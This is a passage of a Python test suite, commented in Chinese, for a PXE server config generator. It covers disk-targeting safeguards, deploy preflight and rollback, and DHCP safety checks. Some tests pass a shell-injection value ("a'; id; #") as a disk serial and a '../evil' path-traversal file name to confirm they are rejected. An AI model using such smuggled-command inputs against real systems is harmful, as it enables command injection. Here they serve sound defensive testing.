        res2 = self.server.deploy_files(generate_all(self._cfg()), "")
        self.assertTrue(res2["ok"], res2)
        self.assertTrue(self.os.path.isfile(self._path("user-data")))
        self.assertTrue(any("Migrated:" in ln for ln in res2["log"]), res2["log"])


if __name__ == "__main__":
    unittest.main()

class ReviewFindingsRegressionTest(unittest.TestCase):
    """MiMo Token Plan 审查（R1/R2）发现的问题的回归用例。"""

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_matchers_are_grouped_per_declaration(self):
        """H1：匹配串必须**按声明分组** —— 否则护栏只能证明"至少一块盘被排除"。

        仅数总命中数时，"声明两块、只命中一块"会放行，没命中的那块的 matcher 就是漏的，
        它自己（或系统盘）会走进 clearpart。分组后可以逐组要求必须命中。
        """
        from app.it.pxe.generator import _data_disk_matcher_specs
        got = _data_disk_matcher_specs({"data_disks": [
            {"size": "30G"}, {"serial": "ABC"}, {"size": "20G", "wwid": "0x5000"}]})
        self.assertEqual(got, [["s32212254720"], ["nABC"], ["s21474836480", "w0x5000"]])
        # 生成出来的 dm 用 ; 分组、| 组内取或
        ks = generate_all(self._rhel({"target": {"mode": "auto"}, "layout": "custom",
                                      "partitions": CUSTOM_PARTS,
                                      "data_disks": [{"size": "30G"}, {"size": "20G"}]}))["ks.cfg"]
        self.assertIn("-v dm='s32212254720;s21474836480'", ks)

    def test_match_target_key_is_sanitized(self):
        """M1：target.mode=match 的 serial/model 也会拼进 %pre 的 shell 单引号串。

        这是本轮改动特意要堵的注入面里**同函数、同拼接方式**漏掉的一条
        （只洗了 data_disks 的 serial/wwid）。
        """
        from app.it.pxe.generator import _disk_plan
        dc = {"target": {"mode": "match", "serial": "a'; id; #"}, "layout": "custom",
              "partitions": CUSTOM_PARTS}
        with self.assertRaises(ValueError) as ctx:
            _disk_plan(self._rhel(dc), dc)
        self.assertIn("target.serial", str(ctx.exception))

    def test_size_match_has_tolerance_for_real_disks(self):
        """M2：真实物理盘容量不是整数（"300GB" 盘 ≈ 3000592982016 B）。

        精确字节等值会让"300G"这种写法永远匹配不上 → 每台都中止（可用性），
        或者在用户折算错误时错命中（安全性）。所以改为 ±2% 容差，
        并同时接受"把 GB 当二进制写"的解释。
        """
        from app.it.pxe.generator import _LSBLK_AWK_PRELUDE, _size_to_bytes
        self.assertEqual(_size_to_bytes("300G"), 300 * 1024 ** 3)
        # awk 里确实做了容差比较（不是 ==）
        self.assertIn("<= 0.02", _LSBLK_AWK_PRELUDE)

    def test_serial_match_is_case_insensitive(self):
        """M2：序列号大小写不敏感 —— 用户从文档抄的大写写法不该因此不命中。"""
        from app.it.pxe.generator import _LSBLK_AWK_PRELUDE
        self.assertIn('tolower(gv(L, "SERIAL")) == tolower(v)', _LSBLK_AWK_PRELUDE)
        self.assertIn('tolower(gv(L, "WWN")) == tolower(v)', _LSBLK_AWK_PRELUDE)


class TargetMatchFailSafeTest(unittest.TestCase):
    """生产标准：目标盘匹配键的失效方式必须是"大声报错"，不能是"静默选第一块盘"。

    真机实测（RUNBOOK-STATE §5.46 追加 5）：Ubuntu 侧给 subiquity 一个它不认识的键
    （我们试的是 id_path），它**不报错**，而是把 disk 条目当成没有匹配条件，
    然后匹配第一块盘 —— 实测连写两次、两个不同的 id_path 值，都打到同一块 30G 数据盘，
    20G 系统盘一根没动。**静默抹数据盘**在生产里不可接受，所以：
      · Ubuntu：拒绝 id_path，只允许 serial/model（不匹配会明确报 matched no disk）
      · RHEL  ：mode=match 必须有 serial 或 model（空 key 会让 %pre 命中任意盘）
    """

    def _cfg(self, dc, **kw):
        import importlib
        m = importlib.import_module("tests.test_pxe")
        kw.setdefault("os_type", "ubuntu")
        kw.setdefault("os_version", "22.04")
        kw.setdefault("mirror", "")
        return m._cfg(disk_config=dc, **kw)

    PARTS = [{"mount": "/boot", "size": "1G", "fstype": "ext4"},
             {"mount": "/", "size": "rest", "fstype": "ext4"}]

    def test_ubuntu_rejects_id_path_as_target_match(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "match", "id_path": "pci-0000:00:05.0-scsi-0:0:0:1"},
              "layout": "custom", "partitions": self.PARTS}
        with self.assertRaises(ValueError) as ctx:
            generate_all(self._cfg(dc))
        msg = str(ctx.exception)
        self.assertIn("id_path", msg)
        # 提示必须说清"为什么"：不识别 → 静默退回第一块盘 → 抹数据盘
        self.assertIn("第一块盘", msg)

    def test_ubuntu_match_requires_a_loud_failure_key(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "match"}, "layout": "custom", "partitions": self.PARTS}
        with self.assertRaises(ValueError):
            generate_all(self._cfg(dc))

    def test_rhel_match_without_serial_or_model_is_rejected(self):
        """空 key 会让 `awk -v s=''` 命中任意 SERIAL 为空的盘 —— 静默装错盘。"""
        from app.it.pxe.generator import generate_all
        import importlib
        m = importlib.import_module("tests.test_pxe")
        dc = {"target": {"mode": "match"}, "layout": "custom", "partitions": self.PARTS}
        cfg = m._cfg(disk_config=dc, os_type="rhel", os_version="9",
                     mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        with self.assertRaises(ValueError) as ctx:
            generate_all(cfg)
        self.assertIn("serial", str(ctx.exception))


class TargetDataDiskOverlapTest(unittest.TestCase):
    """生产安全：同一块盘不能既当系统盘、又被声明为要保护的数据盘。

    为什么不能只比名字：§5.42 之后数据盘推荐只给 size/serial/wwid，名字是空的，
    此时纯名字比较恒不成立 —— 这道防线会形同虚设。
    """

    PARTS = [{"mount": "/boot", "size": "1G", "fstype": "ext4"},
             {"mount": "/", "size": "rest", "fstype": "ext4"}]

    def _mk(self, dc, os_type="rhel"):
        import importlib
        m = importlib.import_module("tests.test_pxe")
        kw = dict(disk_config=dc, os_type=os_type)
        if os_type == "rhel":
            kw.update(os_version="9", mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        else:
            kw.update(os_version="22.04", mirror="")
        return m._cfg(**kw)

    def test_target_and_data_disk_same_serial_is_rejected(self):
        """目标盘按 serial 指定，而某块数据盘声明了同一个 serial。"""
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "match", "serial": "SAME123"},
              "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"serial": "SAME123", "wipe": False}]}
        with self.assertRaises(ValueError) as ctx:
            generate_all(self._mk(dc))
        msg = str(ctx.exception)
        self.assertIn("serial", msg)
        self.assertIn("data_disks[0]", msg)

    def test_target_and_data_disk_same_name_is_rejected_even_without_extra_keys(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "name", "name": "sdb"},
              "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"name": "sdb", "size": "30G", "wipe": False}]}
        with self.assertRaises(ValueError):
            generate_all(self._mk(dc))

    def test_ubuntu_path_also_checked(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "name", "name": "sda"},
              "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"name": "sda", "wipe": False}]}
        with self.assertRaises(ValueError):
            generate_all(self._mk(dc, os_type="ubuntu"))

    def test_different_identity_is_allowed(self):
        """正常配置不能被误拦：目标盘 sdb、数据盘是另一块（按 size 声明）。"""
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "name", "name": "sdb"},
              "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"size": "30G", "wipe": False}]}
        ks = generate_all(self._mk(dc))["ks.cfg"]
        self.assertIn("clearpart --drives=sdb", ks)


class WipedDataDiskUsesStableDeviceTest(unittest.TestCase):
    """R2-H3：`wipe=true` 的数据盘会让产物里出现**主动清除**它自己的动作
    （ignoredisk --only-use= / clearpart --drives= / part --ondisk=）。
    这几处若写死盘名（sdb），枚举顺序一反转就会清到另一块盘上 ——
    与 §5.42 同类，只是从"该排除的没排除"变成"主动清错盘"。
    所以必须由 %pre 按**该声明自己的稳定条件**反解出设备名。
    """

    PARTS = [{"mount": "/boot", "size": "1G", "fstype": "ext4"},
             {"mount": "/", "size": "rest", "fstype": "ext4"}]

    def _rhel(self, dc):
        import importlib
        m = importlib.import_module("tests.test_pxe")
        return m._cfg(disk_config=dc, os_type="rhel", os_version="9",
                      mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")

    def test_wiped_data_disk_resolved_in_pre_not_hardcoded(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "auto"}, "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"size": "30G", "mount": "/data", "fstype": "xfs", "wipe": True}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        # %pre 里必须反解出设备名，且解不出来要中止
        self.assertIn("ddev1=$(lsblk", ks)
        self.assertIn("-v gi=1", ks)
        self.assertIn("待格式化的数据盘无法按稳定条件定位", ks)
        # 产物里不能再出现写死的盘名
        self.assertNotIn("--ondisk=sda", ks)
        self.assertNotIn("--ondisk=sdb", ks)
        self.assertIn("--ondisk=$ddev1", ks)
        self.assertIn("ignoredisk --only-use=$target,$ddev1", ks)
        self.assertIn("clearpart --drives=$target,$ddev1", ks)

    def test_wipe_false_data_disk_still_not_touched_and_not_resolved(self):
        """wipe=false 的数据盘不该出现在 used 里，也不需要反解。"""
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "auto"}, "layout": "custom", "partitions": self.PARTS,
              "data_disks": [{"size": "30G", "wipe": False}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertNotIn("ddev1=", ks)
        self.assertNotIn("--ondisk=$ddev1", ks)
        self.assertIn("ignoredisk --only-use=$target", ks)

    def test_explicit_name_mode_still_uses_the_given_name(self):
        """mode=name 是运维显式选择，仍按盘名（此处只锁行为不回归）。"""
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "name", "name": "sdb"}, "layout": "custom",
              "partitions": self.PARTS,
              "data_disks": [{"size": "30G", "mount": "/data", "fstype": "xfs", "wipe": True,
                              "name": "sdc"}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertNotIn("ddev1=", ks)
        self.assertIn("--ondisk=sdc", ks)


class DeployPreflightAndRollbackTest(unittest.TestCase):
    """R3：/deploy 的"预检 + 回滚"。

    背景（MiMo R3）：/deploy 原本是"先落盘、再核对重载"。重载链路坏掉时，调用方
    要等到超时才失败，而**磁盘已经改过**：正在跑的 dnsmasq 是旧配置，
    /pxe/serve/boot.ipxe 却是新的 —— 未登记的机器卡在 PXE 循环里。
    这里钉死两条：
      a) 链路坏掉时**零落盘**（预检在所有写动作之前，连目录/固件都不碰）；
      b) 写完才发现失败时：**能证明** dnsmasq 没被重启过就回滚成部署前的字节；
         证明不了就保持现状，并明确写着"未回滚"（不含糊其辞）。
    """

    ANSWER = "http://10.0.0.1:8000/pxe/serve"

    def setUp(self):
        import os
        import tempfile
        from unittest import mock

        import app.core.dhcp as dhcp
        from app.it.pxe import server

        self.os = os
        self.mock = mock
        self.server = server
        self.dhcp = dhcp
        self._tmp = tempfile.TemporaryDirectory()
        t = self._tmp.name
        self.web = os.path.join(t, "pxe-web")
        self.tftp = os.path.join(t, "tftp")
        self.confdir = os.path.join(t, "dnsmasq.d")
        self.statedir = os.path.join(t, "state")
        for d in (self.web, self.tftp, self.confdir, self.statedir):
            os.makedirs(d)
        self.conf = os.path.join(self.confdir, "opstk-pxe.conf")
        # dhcp_control 默认**不是**委托路径：需要测重载握手的用例自己改返回值
        self.dhcp_control = mock.Mock(
            return_value={"ok": True, "action": "restart", "msg": "ok", "running": True}
        )
        for target, attr, value in (
            (server, "WEB_ROOT", self.web),
            (server, "TFTP_ROOT", self.tftp),
            (dhcp, "CONF_DIR", self.confdir),          # 真实的 write_conf，写进临时目录
            (dhcp, "PXE_CONF", self.conf),
            (dhcp, "_in_container", lambda: False),    # 默认：预检走"跳过"分支
            # R4 的红线检查在真实环境里读宿主机的默认路由/网卡集合；容器共享宿主
            # 网络命名空间 ⇒ 这里必须隔离，否则用例会随宿主环境漂移。
            # 专心测预检/回滚；红线本身的接入点另有专门用例。
            (dhcp, "check_dhcp_conf_safety", lambda *a, **k: (True, "")),
            (dhcp, "is_linux", lambda: True),
            (dhcp, "sudo_ok", lambda: True),
            (dhcp, "ensure_dirs", lambda dirs=None: []),
            (dhcp, "dhcp_control", self.dhcp_control),
        ):
            p = mock.patch.object(target, attr, value)
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(self._tmp.cleanup)

    # ── 辅助 ──

    def _cfg(self, **kw):
        kw.setdefault("admin_password", "Test@123")
        kw.setdefault("iso_url", "http://10.0.0.1:8000/pxe/iso/test.iso")
        kw.setdefault("http_root", self.ANSWER)
        kw.setdefault("server_ip", "10.0.0.1")
        return PxeConfig(**kw)

    def _files(self, pid, mac="00:11:22:33:44:55", hostname="web-01"):
        self._make_media()
        return generate_all(self._cfg(answer_root=self.ANSWER + "/profiles/" + pid),
                            [{"mac": mac, "hostname": hostname}])

    def _make_media(self):
        d = self.os.path.join(self.web, "ubuntu", "22.04")
        self.os.makedirs(d, exist_ok=True)
        for f in ("vmlinuz", "initrd"):
            with open(self.os.path.join(d, f), "w", encoding="utf-8") as fh:
                fh.write("media\n")

    def _tree(self):
        """web 根 + 配置文件的**字节**快照：回滚正确与否只能这样机械复算。"""
        out = {}
        for root, _dirs, names in self.os.walk(self.web):
            for n in names:
                p = self.os.path.join(root, n)
                rel = self.os.path.relpath(p, self.web)
                with open(p, "rb") as fh:
                    out[rel] = fh.read()
        if self.os.path.exists(self.conf):
            with open(self.conf, "rb") as fh:
                out["<conf>"] = fh.read()
        return out

    def _delegate(self, preflight_ok=True):
        """把部署切成"容器 + 宿主机重载委托"那条路径。"""
        self.mock.patch.object(self.dhcp, "_in_container", lambda: True).start()
        self.addCleanup(self.mock.patch.stopall)
        self.mock.patch.object(
            self.dhcp, "reload_preflight",
            lambda *a, **k: ({"ok": True, "skipped": False, "probed": True, "reason": "",
                              "hint": "", "state": None, "log": ["预检：测试桩"]}
                             if preflight_ok else
                             {"ok": False, "skipped": False, "probed": False,
                              "reason": "unit-not-installed", "hint": "测试桩：没装单元",
                              "state": None, "log": ["预检失败：测试桩"]}),
        ).start()
        self.dhcp_control.return_value = {
            "ok": True, "action": "restart", "managed": False, "reload_delegated": True,
            "msg": "容器内，等待宿主机重载", "running": True,
        }

    def _wait(self, *results):
        m = self.mock.Mock(side_effect=list(results))
        self.mock.patch.object(self.dhcp, "wait_host_reload", m).start()
        # 生产代码走的是**带重试**的版本（边沿事件可能被 systemd 合并掉，
        # 超时要补触发一次）。测试里让它直接转调上面那个桩，不产生补触发。
        self.mock.patch.object(self.dhcp, "wait_host_reload_retrying",
                               lambda *a, **k: (m(*a, **k), 0)).start()
        self.addCleanup(self.mock.patch.stopall)
        return m

    WAIT_OK = {"ok": True, "state": {"state": "OK", "sha": "x", "ts": "1", "reason": "", "err": ""}}
    # FAIL 状态的时间戳必须**新鲜**：外部审查 U2-F8 之后，reload_failure_is_pre_restart
    # 只认"本次部署之后写下的 FAIL"（陈旧的/别的运行的 FAIL 不能证明这次没重启过）。
    # 夹具里用一个远未来的 ts，等价于"刚写的"，从而测的是判据本身而不是时钟。
    _FRESH_TS = "9999999999"
    WAIT_TEST_FAILED = {"ok": False, "state": {"state": "FAIL", "sha": "", "ts": _FRESH_TS,
                                              "reason": "test-failed:badoption", "err": ""}}
    WAIT_RESTART_FAILED = {"ok": False, "state": {"state": "FAIL", "sha": "", "ts": _FRESH_TS,
                                                  "reason": "restart-failed", "err": ""}}

    # ── 1. 预检失败 ⇒ 零落盘 ──

    def test_backbone_dhcp_conf_is_refused_before_any_write(self):
        """R4：PXE 侧也必须走红线检查 —— 池开在骨干网上要在**落盘之前**被拒绝。

        setUp 里为了 hermetic 把 check_dhcp_conf_safety 换成了放行桩，
        这里装回**真实现**并注入真机事实（ens18 承载默认路由、企业网 10.128.118.0/24）。
        """
        import ipaddress
        self.mock.patch.object(
            self.dhcp, "protected_networks",
            lambda providers=None: ("ens18", [ipaddress.ip_network("10.128.118.0/24")], "")
        ).start()
        self.addCleanup(self.mock.patch.stopall)
        self.mock.patch.object(self.dhcp, "check_dhcp_conf_safety",
                               _REAL_CHECK_DHCP_CONF_SAFETY).start()
        self.addCleanup(self.mock.patch.stopall)
        orig_listdir = self.os.listdir

        def fake_listdir(p):
            if p == "/sys/class/net":
                return ["lo", "ens18", "ens19", "docker0"]
            return orig_listdir(p)

        self.mock.patch.object(self.dhcp.os, "listdir", fake_listdir).start()
        self.addCleanup(self.mock.patch.stopall)

        pid = "a" * 32
        self._delegate()
        files = self._files(pid)
        files["dnsmasq.conf"] = ("interface=ens18\nbind-interfaces\n"
                                 "dhcp-range=10.0.0.100,10.0.0.200,12h\n")
        res = self.server.deploy_files(files, pid)
        self.assertFalse(res["ok"])
        self.assertEqual(res.get("preflight_reason"), "dhcp-safety")
        self.assertEqual(res["files_written"], [])
        self.assertIn("本次未写入任何文件", res["errors"][0])
        self.assertEqual(sorted(self._tree()), ["ubuntu/22.04/initrd", "ubuntu/22.04/vmlinuz"])

    def test_preflight_failure_writes_nothing(self):
        pid = "a" * 32
        self._delegate(preflight_ok=False)
        res = self.server.deploy_files(self._files(pid), pid)
        self.assertFalse(res["ok"])
        self.assertTrue(res["preflight_failed"])
        self.assertEqual(res["preflight_reason"], "unit-not-installed")
        self.assertEqual(res["files_written"], [])
        self.assertIn("本次未写入任何文件", res["errors"][0])
        # 磁盘上什么都没变：没有配置、没有应答文件、连 profiles/<pid> 目录都不该存在
        self.assertFalse(self.os.path.exists(self.conf))
        self.assertFalse(self.os.path.exists(
            self.os.path.join(self.web, self.server.PROFILE_SCOPE_DIR, pid)))
        # 只该有测试自己铺的媒体文件
        self.assertEqual(sorted(self._tree()), ["ubuntu/22.04/initrd", "ubuntu/22.04/vmlinuz"])

    def test_preflight_reports_missing_state_dir(self):
        """状态目录没挂上（compose 漏挂载）也要在落盘前挡住。"""
        self.mock.patch.object(self.dhcp, "_in_container", lambda: True).start()
        self.addCleanup(self.mock.patch.stopall)
        self.mock.patch.object(self.dhcp, "HOST_RELOAD_STATE_DIR",
                               self.os.path.join(self._tmp.name, "nope")).start()
        self.addCleanup(self.mock.patch.stopall)
        pid = "a" * 32
        res = self.server.deploy_files(self._files(pid), pid)
        self.assertFalse(res["ok"])
        self.assertEqual(res["preflight_reason"], "state-dir-missing")
        self.assertEqual(res["files_written"], [])
        self.assertFalse(self.os.path.exists(self.conf))

    def test_preflight_skipped_without_dnsmasq_config(self):
        """没有 dnsmasq.conf 就没有"重载"这回事，不该白等预检。"""
        pre = self.mock.Mock(return_value={"ok": True, "log": [], "reason": ""})
        self.mock.patch.object(self.dhcp, "reload_preflight", pre).start()
        self.addCleanup(self.mock.patch.stopall)
        res = self.server.deploy_files({"boot.ipxe": "#!ipxe\nexit\n"}, "")
        self.assertFalse(pre.called)
        self.assertTrue(res["ok"])

    # ── 2. 写完才发现失败 ⇒ 能证明就回滚 ──

    def test_rollback_on_pre_restart_failure_restores_bytes(self):
        pid = "a" * 32
        self._delegate()
        self._wait(self.WAIT_OK)
        res1 = self.server.deploy_files(self._files(pid), pid)
        self.assertTrue(res1["ok"], res1)
        before = self._tree()

        # 第二次部署：换一台机器（按 MAC 的应答文件集合会变）+ 宿主机在 --test 阶段失败
        self._wait(self.WAIT_TEST_FAILED, self.WAIT_OK)
        res2 = self.server.deploy_files(
            self._files(pid, mac="aa:bb:cc:dd:ee:ff", hostname="db-02"), pid)
        self.assertFalse(res2["ok"])
        self.assertTrue(res2["rolled_back"])
        self.assertEqual(res2["files_written"], [])
        self.assertTrue(any("已回滚" in e for e in res2["errors"]), res2["errors"])
        self.assertTrue(any("test-failed" in e for e in res2["errors"]), res2["errors"])
        # 关键断言：磁盘逐字节回到部署前（含 dnsmasq 配置，且新增的文件要被删掉）
        self.assertEqual(self._tree(), before)

    def test_externally_modified_file_is_not_overwritten_by_rollback(self):
        """★ U2-F7：回滚之前先确认"磁盘上现在还是本次写下的那份"。

        场景：部署写到一半失败、正要回滚，而**在我们写完之后有别的程序或人改了其中一个文件**。
        改前的行为是把部署前的旧内容写回去 —— 等于**悄悄覆盖别人的改动**，还报"已回滚"。
        现在这类路径一律不动、在结论里点名；其余路径照常回滚。

        注入点选 `dhcp_control`：它在"文件全部写完"之后、"等宿主机重载/回滚"之前被调用，
        正好是那个窗口。
        """
        pid = "b" * 32
        self._delegate()
        self._wait(self.WAIT_OK)
        self.assertTrue(self.server.deploy_files(self._files(pid), pid)["ok"])
        flat = self.os.path.join(self.web, "boot.ipxe")
        self.assertTrue(self.os.path.exists(flat), "扁平默认菜单没被写出来，用例前提不成立")
        before = self._tree()

        def edit_then_report(*a, **k):
            with open(flat, "w", encoding="utf-8") as fh:
                fh.write("EXTERNALLY-EDITED\n")
            return {"ok": True, "action": "restart", "managed": False,
                    "reload_delegated": True, "msg": "容器内，等待宿主机重载", "running": True}

        self.dhcp_control.side_effect = edit_then_report
        # 第二次部署（换一台机器）在 `--test` 阶段失败 ⇒ 可安全回滚
        self._wait(self.WAIT_TEST_FAILED, self.WAIT_OK)
        res = self.server.deploy_files(
            self._files(pid, mac="aa:bb:cc:dd:ee:ff", hostname="db-02"), pid)

        self.assertFalse(res["ok"])
        self.assertFalse(res["rolled_back"], res)
        self.assertTrue(any("部分未回滚" in e for e in res["errors"]), res["errors"])
        self.assertTrue(any("别的程序或人" in e for e in res["errors"]), res["errors"])
        # ★ 核心断言：别人的改动原样留着
        with open(flat, encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "EXTERNALLY-EDITED\n")
        # 其余文件照常回滚（本次新建的删掉、改写的回到旧字节）
        after = self._tree()
        self.assertEqual({k: v for k, v in after.items() if k != "boot.ipxe"},
                         {k: v for k, v in before.items() if k != "boot.ipxe"})
        # 写入没有被真正撤回 ⇒ files_written 必须保留（不能谎报"什么都没发生"）
        self.assertTrue(res["files_written"], res)

    def test_rollback_removes_files_that_did_not_exist_before(self):
        """第一次部署就失败时，回滚要把这次**新建**的文件删掉。

        只删文件、不删目录：空目录不承载任何配置内容（HTTP 侧对缺失文件就是 404），        而"删目录"会和并发的另一次部署抢同一条路径。所以这里断言的是 scope 下
        **没有任何文件**残留，而不是整个目录不存在（`user-data/` 本来就是目录）。
        """
        pid = "a" * 32
        self._delegate()
        self._wait(self.WAIT_TEST_FAILED)
        res = self.server.deploy_files(self._files(pid), pid)
        self.assertTrue(res["rolled_back"])
        self.assertFalse(self.os.path.exists(self.conf))
        scope = self.os.path.join(self.web, self.server.PROFILE_SCOPE_DIR, pid)
        left = [self.os.path.relpath(self.os.path.join(r, n), scope)
                for r, _dirs, ns in self.os.walk(scope) for n in ns]
        self.assertEqual(left, [], "回滚后不该留下文件：" + str(left))

    def test_no_rollback_when_restart_may_have_happened(self):
        """报的是 restart-failed ⇒ 无法证明守护进程没被重启 ⇒ **绝不**回滚。"""
        pid = "a" * 32
        self._delegate()
        self._wait(self.WAIT_OK)
        self.assertTrue(self.server.deploy_files(self._files(pid), pid)["ok"])
        before = self._tree()

        self._wait(self.WAIT_RESTART_FAILED)
        res = self.server.deploy_files(
            self._files(pid, mac="aa:bb:cc:dd:ee:ff", hostname="db-02"), pid)
        self.assertFalse(res["ok"])
        self.assertFalse(res.get("rolled_back"))
        self.assertTrue(res["files_written"])
        self.assertTrue(any("未回滚" in e for e in res["errors"]), res["errors"])
        # 新内容保持原样（不回滚）
        self.assertNotEqual(self._tree(), before)

    def test_rollback_refused_when_a_target_was_a_directory(self):
        """为让路删掉过东西（旧布局迁移）⇒ 恢复不了 ⇒ 整体放弃回滚并说清楚。"""
        d = self.os.path.join(self.web, "boot.ipxe")
        self.os.makedirs(d)
        with open(self.os.path.join(d, "old"), "w", encoding="utf-8") as fh:
            fh.write("旧布局残留\n")
        res = self.server.deploy_files({"boot.ipxe": "#!ipxe\nnew\n", "../evil": "x"}, "")
        self.assertFalse(res["ok"])
        self.assertFalse(res.get("rolled_back"))
        self.assertTrue(any("无法回滚" in e for e in res["errors"]), res["errors"])
        with open(self.os.path.join(self.web, "boot.ipxe"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "#!ipxe\nnew\n")

    # ── 3. 还没碰 dnsmasq 就失败 ⇒ 无条件回滚 ──

    def test_write_failure_rolls_back_already_written_files(self):
        self._delegate()
        with open(self.os.path.join(self.web, "boot.ipxe"), "w", encoding="utf-8") as fh:
            fh.write("OLD\n")
        # dict 顺序：boot.ipxe 先写成功，第二个键非法 → 中途失败
        res = self.server.deploy_files({"boot.ipxe": "NEW\n", "../evil": "x"}, "")
        self.assertFalse(res["ok"])
        self.assertTrue(res["rolled_back"])
        self.assertEqual(res["files_written"], [])
        with open(self.os.path.join(self.web, "boot.ipxe"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "OLD\n")

    def test_conf_write_failure_rolls_back_http_files(self):
        self._delegate()
        self.mock.patch.object(
            self.dhcp, "write_conf", self.mock.Mock(return_value=False)).start()
        self.addCleanup(self.mock.patch.stopall)
        with open(self.os.path.join(self.web, "boot.ipxe"), "w", encoding="utf-8") as fh:
            fh.write("OLD\n")
        res = self.server.deploy_files(
            {"boot.ipxe": "NEW\n", "dnsmasq.conf": "interface=ens19\n"}, "")
        self.assertFalse(res["ok"])
        self.assertTrue(res["rolled_back"])
        with open(self.os.path.join(self.web, "boot.ipxe"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "OLD\n")

    def test_successful_deploy_reports_no_rollback(self):
        pid = "a" * 32
        self._delegate()
        self._wait(self.WAIT_OK)
        res = self.server.deploy_files(self._files(pid), pid)
        self.assertTrue(res["ok"], res)
        self.assertNotIn("rolled_back", res)
        self.assertTrue(res["files_written"])
        self.assertTrue(self.os.path.exists(self.conf))


class PxeReviewFixesTest(unittest.TestCase):
    """外部审查（MiMo v2.6-pro）在 PXE 模块报出的 4 条 —— 逐条回归。

    U1-F1 Ubuntu 数据盘分区发 "rest"（subiquity 报错整机中止，且此时数据盘已被抹）
    U1-F2 target.mode=match 只用 model 时无法与 data_disks 交叉校验 ⇒ 拒绝这种写法
    U1-F3 %pre 里 data disk 反解传了单组条件却给 gi=i+1 ⇒ 第 2 个及以后恒失败
    U1-F4 Ubuntu 数据盘的 wipe 目标用 /dev/<name>（不稳定）而不是稳定标识
    """

    DD = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
          "partitions": CUSTOM_PARTS,
          "data_disks": [{"name": "sdc", "size": "30G", "serial": "SN-DATA-1",
                          "mount": "/backup", "fstype": "xfs", "wipe": True}]}

    def _ubuntu_cfg(self, disk_config):
        files = generate_all(_cfg(disk_config=disk_config))
        return yaml.safe_load(files["user-data"])["autoinstall"]["storage"]["config"]

    # ---- F1 ----
    def test_ubuntu_data_disk_partition_uses_minus_one(self):
        cfg = self._ubuntu_cfg(self.DD)
        self.assertIn({"type": "partition", "id": "datap0", "device": "data0",
                       "size": -1}, cfg)
        self.assertNotIn('"rest"', json.dumps(cfg))

    # ---- F4 ----
    def test_ubuntu_data_disk_uses_serial_when_available(self):
        cfg = self._ubuntu_cfg(self.DD)
        data = [c for c in cfg if c.get("id") == "data0"][0]
        self.assertEqual(data.get("serial"), "SN-DATA-1")
        self.assertNotIn("path", data)
        self.assertEqual(data["wipe"], "superblock")

    def test_ubuntu_data_disk_falls_back_to_path_without_serial(self):
        dd = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": CUSTOM_PARTS,
              "data_disks": [{"name": "sdc", "size": "30G", "mount": "/backup",
                              "fstype": "xfs", "wipe": True}]}
        cfg = self._ubuntu_cfg(dd)
        data = [c for c in cfg if c.get("id") == "data0"][0]
        self.assertEqual(data.get("path"), "/dev/sdc")     # 没有稳定键才退回盘名
        self.assertNotIn("serial", data)

    # ---- F2 ----
    def test_model_only_match_with_data_disks_is_rejected(self):
        dd = {"target": {"mode": "match", "model": "Samsung SSD 870"},
              "layout": "custom", "partitions": CUSTOM_PARTS,
              "data_disks": [{"name": "sda", "size": "500G", "wipe": False}]}
        with self.assertRaises(ValueError) as e:
            generate_all(_cfg(disk_config=dd))
        self.assertIn("model", str(e.exception))

    def test_model_only_match_without_data_disks_still_allowed(self):
        dd = {"target": {"mode": "match", "model": "Samsung SSD 870"},
              "layout": "custom", "partitions": CUSTOM_PARTS}
        self.assertTrue(generate_all(_cfg(disk_config=dd)))

    # ---- F3 ----
    def test_pre_resolves_each_wiped_data_disk_with_its_own_group(self):
        dd = {"target": {"mode": "auto"}, "layout": "custom",
              "partitions": CUSTOM_PARTS,
              "data_disks": [{"name": "sdb", "size": "30G", "wipe": True},
                             {"name": "sdc", "size": "40G", "wipe": True}]}
        ks = generate_all(_cfg(os_type="rhel", os_version="9.3", disk_config=dd,
                               mirror="http://10.0.0.1/pxe/serve/repo"))["ks.cfg"]
        start = ks.index("%pre")
        end = ks.index("%end") if "%end" in ks else len(ks)
        pre = ks[start:end]
        self.assertIn("ddev1=", pre)
        self.assertIn("ddev2=", pre)
        # 单组条件必须配 gi=1：以前传 i+1 ⇒ 第 2 个查 grp[2] 恒空 ⇒ 装机必中止
        self.assertNotIn("-v gi=2", pre)
        self.assertEqual(pre.count("-v gi=1"), 2)
        # 两个设备名各自带自己的容量条件（30G/40G 的字节数），不能都拿第一组
        self.assertIn(str(30 * 1024 ** 3), pre)
        self.assertIn(str(40 * 1024 ** 3), pre)


class PxeProfileInputSurfaceTest(unittest.TestCase):
    """U7-F4：PxeProfileIn 与 PxeGenerateIn 的校验面对齐（保存期就该拦住的东西）。

    改前 PxeGenerateIn 有通配控制字符闸 + deploy_mode 白名单 + server_ip 校验 +
